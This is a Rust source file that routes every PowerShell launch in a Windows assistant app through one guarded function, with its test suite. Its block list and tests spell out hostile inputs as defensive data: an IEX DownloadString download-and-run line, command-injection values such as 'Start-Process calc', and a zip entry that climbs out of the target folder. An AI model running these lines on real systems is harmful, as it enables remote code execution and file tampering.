// The only place where Jarvis starts PowerShell.
//
// Before: eight places built their own `powershell -ExecutionPolicy Bypass ...` line, one of them from a script file that
// lay in a writable folder, two with values written into the text of the script. Now every start goes through `command()`:
//   * the script is NOT a parameter: it is one of the `Script` kinds below, its text is a constant of the program (a
//     command, a phrase or a Lua script cannot bring its own text here);
//   * the values go only through the environment of the process (or, for the ways of the voice that need it, as base64
//     assignments in front of the constant text), never into the text itself;
//   * every kind names the variables it takes; a foreign name, a missing one, a control character or a value of the wrong
//     shape (a path outside the place of the kind, a number out of range, a zip whose SHA-256 is not the pinned one)
//     refuses the start BEFORE any process exists;
//   * the guard is checked on every call and fails closed: when the table of scripts is not intact (a text with an
//     download, an Invoke-Expression, a nested Start-Process, ...) nothing is started.
// A test reads all the sources of the workspace and fails when PowerShell is named anywhere else (see `tests`).

use std::path::{Path, PathBuf};
use std::process::Command;

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Script {
    // `exit 0`: does a PowerShell start at all (diagnostics, the ways of the voice)
    Probe,
    // the temperature of the thermal zones / of ACPI (read only)
    ThermalZones,
    ThermalAcpi,
    // the list of installed programs (read only)
    AppIndex,
    // a picture of the main screen into a temporary file
    Screen,
    // the Windows voice speaks the text
    Speak,
    // the installed voices of Windows (two spellings of the list: for the report and for the settings)
    VoicesReport,
    VoicesPicker,
    // unpack the Piper zip (the pinned one) into the folder of the program
    InstallPiper,
    // the watcher of the notification center (reads only the count and the texts Windows gives it)
    NotifyWatcher,
    // the titles of the windows of the players and browsers (read only): what is playing now
    MediaNow,
    Bluetooth,
}

pub const ALL: [Script; 12] = [
    Script::Probe,
    Script::ThermalZones,
    Script::ThermalAcpi,
    Script::AppIndex,
    Script::Screen,
    Script::Speak,
    Script::VoicesReport,
    Script::VoicesPicker,
    Script::InstallPiper,
    Script::NotifyWatcher,
    Script::MediaNow,
    Script::Bluetooth,
];

const THERMAL_ZONES: &str = "(Get-CimInstance Win32_PerfFormattedData_Counters_ThermalZoneInformation -ErrorAction Stop | Select-Object -First 1).Temperature";
const THERMAL_ACPI: &str = "(Get-CimInstance -Namespace root/wmi -ClassName MSAcpi_ThermalZoneTemperature -ErrorAction Stop | Select-Object -First 1).CurrentTemperature";

const APP_INDEX: &str = r#"[Console]::OutputEncoding = [Text.Encoding]::UTF8
$r = [ordered]@{ start = @(); paths = @() }
try { $r.start = @(Get-StartApps | Select-Object Name, AppID) } catch {}
foreach ($k in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths', 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths') {
  Get-ChildItem $k -ErrorAction SilentlyContinue | ForEach-Object {
    $d = $_.GetValue('')
    if ($d) { $r.paths += [pscustomobject]@{ exe = $_.PSChildName; path = [Environment]::ExpandEnvironmentVariables(([string]$d).Trim('"')) } }
  }
}
$r | ConvertTo-Json -Depth 3 -Compress"#;

// DPI-aware first: with display scaling above 100% the picture would be only a part of the screen
const SCREEN: &str = r#"Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool SetProcessDPIAware();' -Name Dpi -Namespace Jarvis
[void][Jarvis.Dpi]::SetProcessDPIAware()
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
$g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size)
$w = [Math]::Min(1600, $b.Width); $h = [int]($b.Height * $w / $b.Width)
$small = New-Object System.Drawing.Bitmap $bmp, $w, $h
$enc = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
$p = New-Object System.Drawing.Imaging.EncoderParameters 1
$p.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality), 70L
$small.Save($env:JARVIS_SCREEN_OUT, $enc, $p)"#;

const VOICES_REPORT: &str = "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).GetInstalledVoices() | Where-Object { $_.Enabled } | ForEach-Object { $_.VoiceInfo.Name + ' | ' + $_.VoiceInfo.Culture.Name + ' | ' + $_.VoiceInfo.Gender }";
const VOICES_PICKER: &str = "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).GetInstalledVoices() | Where-Object { $_.Enabled } | ForEach-Object { $_.VoiceInfo.Name + '|' + $_.VoiceInfo.Culture.Name + '|' + $_.VoiceInfo.Gender }";

// only the process name and the title of the window of the known players and browsers: nothing is changed, nothing is sent
const MEDIA_NOW: &str = "[Console]::OutputEncoding = [Text.Encoding]::UTF8; Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -and $_.ProcessName -match '^(AIMP|chrome|msedge|firefox|browser|opera|brave|vlc|spotify|wmplayer|foobar2000|Music.UI|mpc-hc|PotPlayer)' } | ForEach-Object { $_.ProcessName + '|' + $_.MainWindowTitle }";

// the Bluetooth devices Windows knows (the names and the states): nothing is changed
const BLUETOOTH: &str = "[Console]::OutputEncoding = [Text.Encoding]::UTF8; Get-PnpDevice -Class Bluetooth -ErrorAction SilentlyContinue | Where-Object { $_.FriendlyName } | ForEach-Object { $_.FriendlyName + '|' + $_.Status }";

const INSTALL_PIPER: &str = "Expand-Archive -LiteralPath $env:JARVIS_ZIP -DestinationPath $env:JARVIS_DEST -Force";

// the text of the watcher takes the pid of Jarvis from the environment (it was a -File with a -ParentPid argument)
const NOTIFY_HEAD: &str = "$ParentPid = 0; if ($env:JARVIS_PARENT_PID) { $ParentPid = [int]$env:JARVIS_PARENT_PID }\n";

impl Script {
    pub fn text(self) -> String {
        match self {
            Script::Probe => "exit 0".to_string(),
            Script::ThermalZones => THERMAL_ZONES.to_string(),
            Script::ThermalAcpi => THERMAL_ACPI.to_string(),
            Script::AppIndex => APP_INDEX.to_string(),
            Script::Screen => SCREEN.to_string(),
            Script::Speak => crate::tts::SAPI_SCRIPT.to_string(),
            Script::VoicesReport => VOICES_REPORT.to_string(),
            Script::VoicesPicker => VOICES_PICKER.to_string(),
            Script::InstallPiper => INSTALL_PIPER.to_string(),
            Script::NotifyWatcher => format!("{}{}", NOTIFY_HEAD, crate::notify::EXT_BODY),
            Script::MediaNow => MEDIA_NOW.to_string(),
            Script::Bluetooth => BLUETOOTH.to_string(),
        }
    }

    // (required variables, optional variables)
    fn vars(self) -> (&'static [&'static str], &'static [&'static str]) {
        match self {
            Script::Screen => (&["JARVIS_SCREEN_OUT"], &[]),
            Script::Speak => (&["JARVIS_TTS_TEXT", "JARVIS_TTS_LANG", "JARVIS_TTS_RATE", "JARVIS_TTS_NOTE"], &["JARVIS_TTS_VOLUME", "JARVIS_TTS_VOICE"]),
            Script::InstallPiper => (&["JARVIS_ZIP", "JARVIS_DEST"], &[]),
            Script::NotifyWatcher => (&["JARVIS_PARENT_PID"], &[]),
            _ => (&[], &[]),
        }
    }

    pub fn name(self) -> &'static str {
        match self {
            Script::Probe => "probe",
            Script::ThermalZones => "thermal_zones",
            Script::ThermalAcpi => "thermal_acpi",
            Script::AppIndex => "app_index",
            Script::Screen => "screen",
            Script::Speak => "speak",
            Script::VoicesReport => "voices_report",
            Script::VoicesPicker => "voices_picker",
            Script::InstallPiper => "install_piper",
            Script::NotifyWatcher => "notify_watcher",
            Script::MediaNow => "media_now",
            Script::Bluetooth => "bluetooth",
        }
    }
}

// How the process is asked for (the voice tries several, see tts.rs)
#[derive(Clone, Copy, Debug, Default)]
pub struct Way {
    pub absolute: bool,   // the full path of powershell.exe instead of the name looked up in PATH
    pub inline_env: bool, // the values go as base64 assignments in front of the text, not into the environment
    pub no_flags: bool,   // -WindowStyle Hidden instead of CREATE_NO_WINDOW is the caller's business; here only the flag
}

// what a text of a script must never contain: a second program, a download, a dynamic evaluation, a changed policy
const FORBIDDEN: [&str; 14] = [
    "invoke-expression", "iex ", "iex(", "downloadstring", "downloadfile", "invoke-webrequest", "invoke-restmethod", "start-process", "-encodedcommand",
    "add-mppreference", "set-executionpolicy", "new-service", "schtasks", "reg add",
];

pub fn lint(text: &str) -> Result<(), String> {
    let low = text.to_lowercase();
    for bad in FORBIDDEN {
        if low.contains(bad) {
            return Err(format!("в тексте скрипта запрещённое «{}»", bad.trim()));
        }
    }
    Ok(())
}

#[cfg(test)]
static BROKEN: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
#[cfg(test)]
pub static TEST_LOCK: parking_lot::Mutex<()> = parking_lot::Mutex::new(());

// is the protective mechanism itself intact: the table is whole and every text passes the lint
fn mechanism_ok() -> Result<(), String> {
    #[cfg(test)]
    if BROKEN.load(std::sync::atomic::Ordering::SeqCst) {
        return Err("защитный механизм недоступен".to_string());
    }
    for s in ALL {
        let text = s.text();
        if text.trim().is_empty() {
            return Err(format!("скрипт «{}» пуст", s.name()));
        }
        lint(&text).map_err(|e| format!("скрипт «{}»: {}", s.name(), e))?;
    }
    Ok(())
}

fn abs_clean(v: &str) -> Result<PathBuf, String> {
    let p = Path::new(v);
    if !p.is_absolute() || v.chars().any(|c| c.is_control()) || p.components().any(|c| matches!(c, std::path::Component::ParentDir)) {
        return Err("путь должен быть полным, без «..» и управляющих символов".to_string());
    }
    Ok(p.to_path_buf())
}

fn check_value(script: Script, k: &str, v: &str) -> Result<(), String> {
    if v.contains('\0') || v.len() > 65536 {
        return Err(format!("значение «{}» недопустимо", k));
    }
    match k {
        "JARVIS_TTS_TEXT" => Ok(()),
        "JARVIS_TTS_LANG" => {
            let ok = v.len() >= 2 && v.len() <= 8 && v.chars().all(|c| c.is_ascii_alphabetic() || c == '-');
            ok.then_some(()).ok_or_else(|| "язык озвучивания недопустим".to_string())
        }
        "JARVIS_TTS_RATE" => v.parse::<i32>().ok().filter(|n| (-10..=10).contains(n)).map(|_| ()).ok_or_else(|| "скорость вне -10..10".to_string()),
        "JARVIS_TTS_VOLUME" => v.parse::<u32>().ok().filter(|n| *n <= 100).map(|_| ()).ok_or_else(|| "громкость вне 0..100".to_string()),
        "JARVIS_TTS_VOICE" => (!v.chars().any(|c| c.is_control())).then_some(()).ok_or_else(|| "имя голоса с управляющими символами".to_string()),
        "JARVIS_TTS_NOTE" => abs_clean(v).map(|_| ()),
        "JARVIS_PARENT_PID" => (!v.is_empty() && v.len() <= 10 && v.chars().all(|c| c.is_ascii_digit())).then_some(()).ok_or_else(|| "pid не число".to_string()),
        "JARVIS_SCREEN_OUT" => {
            let p = abs_clean(v)?;
            let name = p.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if p.parent() != Some(std::env::temp_dir().as_path()) || !name.starts_with("jarvis_screen_") || !name.ends_with(".jpg") {
                return Err("снимок можно писать только во временную папку, в файл jarvis_screen_*.jpg".to_string());
            }
            Ok(())
        }
        "JARVIS_DEST" => {
            let p = abs_clean(v)?;
            (p == *crate::APP_DIR).then_some(()).ok_or_else(|| "распаковывать можно только в папку Jarvis".to_string())
        }
        "JARVIS_ZIP" => {
            let p = abs_clean(v)?;
            // next to the destination (a folder only its owner writes), under the pinned name, with the pinned hash
            if p.parent() != Some(crate::APP_DIR.as_path()) || p.file_name().and_then(|n| n.to_str()) != Some(crate::voice_install::ZIP_NAME) {
                return Err("архив должен лежать в папке Jarvis под своим именем".to_string());
            }
            let h = crate::integrity::sha256_file(&p).map_err(|_| "архив не читается".to_string())?;
            if h != crate::voice_install::pinned_zip_sha256() {
                return Err("SHA-256 архива не совпадает с закреплённым: распаковка отклонена".to_string());
            }
            // and what the archive says it holds: everything under piper/, no links, no strange names, a sane size
            crate::integrity::check_archive(&p, "piper", 5000, 800_000_000).map_err(|e| format!("архив не прошёл проверку перед распаковкой: {}", e))?;
            Ok(())
        }
        _ => Err(format!("переменная «{}» не для скрипта «{}»", k, script.name())),
    }
}

// the guard: Ok only when the mechanism is intact and the values fit the kind
pub fn authorize(script: Script, envs: &[(&str, String)]) -> Result<(), String> {
    mechanism_ok()?;
    let (required, optional) = script.vars();
    for (k, v) in envs {
        if !required.contains(k) && !optional.contains(k) {
            return Err(format!("PowerShell «{}»: переменная «{}» не разрешена", script.name(), k));
        }
        check_value(script, k, v).map_err(|e| format!("PowerShell «{}»: {}", script.name(), e))?;
    }
    for r in required {
        if !envs.iter().any(|(k, _)| k == r) {
            return Err(format!("PowerShell «{}»: нет обязательной переменной «{}»", script.name(), r));
        }
    }
    Ok(())
}

// the script with the values written into it (the text as base64: no quote of the text can break the command)
pub fn inline_env_script(script: &str, envs: &[(&str, String)]) -> String {
    let mut out = String::new();
    for (k, v) in envs {
        out.push_str(&format!("$env:{} = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{}'))\n", k, crate::ai::base64(v.as_bytes())));
    }
    out.push_str(script);
    out
}

pub fn encoded_command(script: &str) -> String {
    let bytes: Vec<u8> = script.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
    crate::ai::base64(&bytes)
}

fn powershell_path() -> PathBuf {
    let root = std::env::var_os("SystemRoot").map(PathBuf::from).unwrap_or_else(|| PathBuf::from("C:\\Windows"));
    root.join("System32").join("WindowsPowerShell").join("v1.0").join("powershell.exe")
}

// the arguments are fixed; the caller sets the standard handles and the window flags of its own
pub fn command(script: Script, envs: &[(&str, String)], way: Way) -> Result<Command, String> {
    authorize(script, envs)?;
    let mut c = Command::new(if way.absolute { powershell_path() } else { PathBuf::from("powershell") });
    c.args(["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass"]);
    if way.no_flags {
        c.args(["-WindowStyle", "Hidden"]);
    }
    let text = script.text();
    if way.inline_env {
        c.args(["-EncodedCommand", &encoded_command(&inline_env_script(&text, envs))]);
    } else {
        c.args(["-EncodedCommand", &encoded_command(&text)]);
        for (k, v) in envs {
            c.env(k, v);
        }
    }
    Ok(c)
}

// a command whose window is hidden and whose handles are NUL (the usual case)
pub fn quiet(script: Script, envs: &[(&str, String)]) -> Result<Command, String> {
    let mut c = command(script, envs, Way::default())?;
    // A program without a console (the autostart, a shortcut, the installed window) has no valid standard handles to inherit:
    // CreateProcess then fails with «os error 50» (the voice had it once, and the install of the voice from the program here).
    // The input is closed always; a caller that reads the output sets its own pipe afterwards (the last setting wins).
    c.stdin(std::process::Stdio::null());
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        c.creation_flags(0x0800_0000);
    }
    Ok(c)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::atomic::Ordering::SeqCst;

    fn args(c: &Command) -> Vec<String> {
        c.get_args().map(|a| a.to_string_lossy().to_string()).collect()
    }

    fn envs_of(s: Script) -> Vec<(&'static str, String)> {
        match s {
            Script::Screen => vec![("JARVIS_SCREEN_OUT", std::env::temp_dir().join("jarvis_screen_1.jpg").display().to_string())],
            Script::Speak => vec![("JARVIS_TTS_TEXT", "привет".into()), ("JARVIS_TTS_LANG", "ru".into()), ("JARVIS_TTS_RATE", "0".into()), ("JARVIS_TTS_NOTE", std::env::temp_dir().join("n").display().to_string())],
            Script::NotifyWatcher => vec![("JARVIS_PARENT_PID", "42".into())],
            _ => vec![],
        }
    }

    #[test]
    fn every_kind_starts_with_fixed_arguments_and_its_own_constant_text() {
        let _g = TEST_LOCK.lock();
        for s in ALL.iter().filter(|s| !matches!(s, Script::InstallPiper)) {
            let c = command(*s, &envs_of(*s), Way::default()).unwrap_or_else(|e| panic!("{}: {}", s.name(), e));
            let a = args(&c);
            assert_eq!(&a[..4], ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass"]);
            assert_eq!(a[4], "-EncodedCommand");
            assert_eq!(a[5], encoded_command(&s.text()), "{}", s.name());
            assert_eq!(a.len(), 6, "nothing else may stand on the command line: {:?}", a);
        }
    }

    #[test]
    fn a_value_never_gets_into_the_text_and_a_foreign_variable_is_refused() {
        let _g = TEST_LOCK.lock();
        let evil = "x'; Start-Process calc; '";
        let envs = vec![("JARVIS_TTS_TEXT", evil.to_string()), ("JARVIS_TTS_LANG", "ru".into()), ("JARVIS_TTS_RATE", "0".into()), ("JARVIS_TTS_NOTE", std::env::temp_dir().join("n").display().to_string())];
        let c = command(Script::Speak, &envs, Way::default()).unwrap();
        assert!(!args(&c).join(" ").contains("calc"));
        let inline = command(Script::Speak, &envs, Way { inline_env: true, ..Way::default() }).unwrap();
        // inline: the text goes only as base64
        let a = args(&inline);
        assert!(!a[a.len() - 1].contains("calc"));
        // a variable of another kind / an unknown one
        for bad in ["JARVIS_ZIP", "PATH", "JARVIS_SCREEN_OUT", "COMSPEC"] {
            let mut e = envs.clone();
            e.push((bad, "x".into()));
            assert!(authorize(Script::Speak, &e).is_err(), "{}", bad);
        }
        // the required one is missing
        assert!(authorize(Script::Speak, &envs[..2]).is_err());
        assert!(authorize(Script::Screen, &[]).is_err());
    }

    #[test]
    fn values_of_the_wrong_shape_are_refused() {
        let _g = TEST_LOCK.lock();
        let ok = envs_of(Script::Speak);
        let with = |k: &str, v: &str| -> Vec<(&'static str, String)> {
            let mut e: Vec<(&'static str, String)> = ok.iter().filter(|(n, _)| *n != k).cloned().collect();
            let name: &'static str = ["JARVIS_TTS_TEXT", "JARVIS_TTS_LANG", "JARVIS_TTS_RATE", "JARVIS_TTS_NOTE", "JARVIS_TTS_VOLUME", "JARVIS_TTS_VOICE"].into_iter().find(|n| *n == k).unwrap();
            e.push((name, v.to_string()));
            e
        };
        assert!(authorize(Script::Speak, &ok).is_ok());
        assert!(authorize(Script::Speak, &with("JARVIS_TTS_LANG", "ru; calc")).is_err());
        assert!(authorize(Script::Speak, &with("JARVIS_TTS_RATE", "99")).is_err());
        assert!(authorize(Script::Speak, &with("JARVIS_TTS_VOLUME", "101")).is_err());
        assert!(authorize(Script::Speak, &with("JARVIS_TTS_TEXT", "a\0b")).is_err());
        assert!(authorize(Script::Speak, &with("JARVIS_TTS_NOTE", "relative.txt")).is_err());
        assert!(authorize(Script::Speak, &with("JARVIS_TTS_NOTE", &format!("{}/../x", std::env::temp_dir().display()))).is_err());
        assert!(authorize(Script::Speak, &with("JARVIS_TTS_VOICE", "a\nb")).is_err());
        assert!(authorize(Script::NotifyWatcher, &[("JARVIS_PARENT_PID", "1; calc".into())]).is_err());
    }

    #[test]
    fn the_screen_goes_only_to_its_own_file_in_the_temp_folder() {
        let _g = TEST_LOCK.lock();
        let t = std::env::temp_dir();
        assert!(authorize(Script::Screen, &[("JARVIS_SCREEN_OUT", t.join("jarvis_screen_7.jpg").display().to_string())]).is_ok());
        for bad in [t.join("other.jpg"), t.join("jarvis_screen_7.ps1"), t.join("sub").join("jarvis_screen_7.jpg"), PathBuf::from("/etc/jarvis_screen_7.jpg")] {
            assert!(authorize(Script::Screen, &[("JARVIS_SCREEN_OUT", bad.display().to_string())]).is_err(), "{}", bad.display());
        }
    }

    #[test]
    fn the_piper_archive_is_unpacked_only_when_it_is_the_pinned_one_and_only_into_the_program_folder() {
        let _g = TEST_LOCK.lock();
        let dest = crate::APP_DIR.clone();
        let zip = dest.join(crate::voice_install::ZIP_NAME);
        let envs = |z: &Path, d: &Path| vec![("JARVIS_ZIP", z.display().to_string()), ("JARVIS_DEST", d.display().to_string())];
        std::fs::create_dir_all(&dest).unwrap();
        // a foreign archive of the right name: the hash does not match
        std::fs::write(&zip, b"PK\x03\x04 not piper").unwrap();
        let e = authorize(Script::InstallPiper, &envs(&zip, &dest)).unwrap_err();
        assert!(e.contains("SHA-256"), "{}", e);
        // a missing archive
        let _ = std::fs::remove_file(&zip);
        assert!(authorize(Script::InstallPiper, &envs(&zip, &dest)).is_err());
        // another folder / another place of the archive
        let other = std::env::temp_dir().join("elsewhere");
        assert!(authorize(Script::InstallPiper, &envs(&zip, &other)).is_err());
        assert!(authorize(Script::InstallPiper, &envs(&other.join(crate::voice_install::ZIP_NAME), &dest)).is_err());
        assert!(authorize(Script::InstallPiper, &[("JARVIS_ZIP", zip.display().to_string())]).is_err());
        // a good archive of the right name with its hash pinned: allowed; the same bytes changed after pinning: refused
        let unix_file = (3u16 << 8, 0o100644u32 << 16);
        let good = crate::integrity::tests::make_zip(&[("piper/piper.exe", unix_file.0, unix_file.1, 0)]);
        std::fs::write(&zip, &good).unwrap();
        crate::voice_install::set_test_pin(Some(crate::integrity::sha256_file(&zip).unwrap()));
        assert!(authorize(Script::InstallPiper, &envs(&zip, &dest)).is_ok());
        let mut changed = good.clone();
        changed[40] ^= 0xff;
        std::fs::write(&zip, &changed).unwrap();
        assert!(authorize(Script::InstallPiper, &envs(&zip, &dest)).unwrap_err().contains("SHA-256"));
        // an archive with a way out of the folder whose hash IS the pinned one is still refused (the names are read first)
        let evil = crate::integrity::tests::make_zip(&[("piper/piper.exe", unix_file.0, unix_file.1, 0), ("piper/../../evil.dll", 0, 0, 0)]);
        std::fs::write(&zip, &evil).unwrap();
        crate::voice_install::set_test_pin(Some(crate::integrity::sha256_file(&zip).unwrap()));
        let e = authorize(Script::InstallPiper, &envs(&zip, &dest)).unwrap_err();
        assert!(e.contains("проверку"), "{}", e);
        crate::voice_install::set_test_pin(None);
        let _ = std::fs::remove_file(&zip);
    }

    #[test]
    fn when_the_guard_is_unavailable_nothing_starts() {
        let _g = TEST_LOCK.lock();
        BROKEN.store(true, SeqCst);
        for s in ALL {
            assert!(command(s, &envs_of(s), Way::default()).is_err(), "{}", s.name());
            assert!(quiet(s, &envs_of(s)).is_err(), "{}", s.name());
        }
        BROKEN.store(false, SeqCst);
        assert!(command(Script::Probe, &[], Way::default()).is_ok());
    }

    #[test]
    fn the_lint_refuses_a_dangerous_text_and_no_text_of_the_table_is_one() {
        for bad in ["Invoke-Expression $x", "IEX (New-Object Net.WebClient).DownloadString('http://x')", "Start-Process calc", "powershell -EncodedCommand AAAA", "Set-ExecutionPolicy Unrestricted", "schtasks /create"] {
            assert!(lint(bad).is_err(), "{}", bad);
        }
        for s in ALL {
            assert!(lint(&s.text()).is_ok(), "{}", s.name());
        }
    }

    // THE list of launch points: PowerShell is named only here and in the files below (which only pass a `Script` kind),
    // and every one of those files asks for it through `psrun`
    #[test]
    fn powershell_is_started_nowhere_but_here() {
        // (the files have CRLF line ends in a Windows checkout)
        let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("..");
        let mut files = Vec::new();
        fn walk(dir: &Path, out: &mut Vec<PathBuf>) {
            for e in std::fs::read_dir(dir).into_iter().flatten().flatten() {
                let p = e.path();
                let n = p.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if p.is_dir() {
                    if n != "target" && n != ".git" && n != "node_modules" {
                        walk(&p, out);
                    }
                } else if n.ends_with(".rs") {
                    out.push(p);
                }
            }
        }
        walk(&root, &mut files);
        assert!(files.len() > 20);
        let this = Path::new(file!()).file_name().unwrap().to_owned();
        let mut users: Vec<String> = Vec::new();
        for f in files {
            // (policy.rs is the judge of the command lines of Lua and starts nothing)
            if f.file_name().unwrap() == this || f.file_name().unwrap() == "policy.rs" || f.file_name().unwrap() == "tests.rs" {
                continue;
            }
            let src = std::fs::read_to_string(&f).unwrap().replace("\r\n", "\n");
            // test modules and comments may talk about it; the code before `#[cfg(test)]` may not start it
            let code: String = src.split("#[cfg(test)]").next().unwrap_or("").lines().filter(|l| !l.trim_start().starts_with("//")).collect::<Vec<_>>().join("\n");
            let low = code.to_lowercase();
            for needle in ["command::new(\"powershell", "command::new(\"pwsh", "command::new(powershell", "-executionpolicy", "-encodedcommand"] {
                assert!(!low.contains(needle), "{}: starts PowerShell by itself ({})", f.display(), needle);
            }
            if src.contains("psrun::") {
                users.push(f.file_name().unwrap().to_string_lossy().to_string());
            }
        }
        users.sort();
        // every privileged operation of the list goes through the funnel
        for must in ["appindex.rs", "health.rs", "notify.rs", "screen.rs", "tts.rs", "voice_install.rs"] {
            assert!(users.iter().any(|u| u == must), "{} does not use psrun: {:?}", must, users);
        }
    }
}
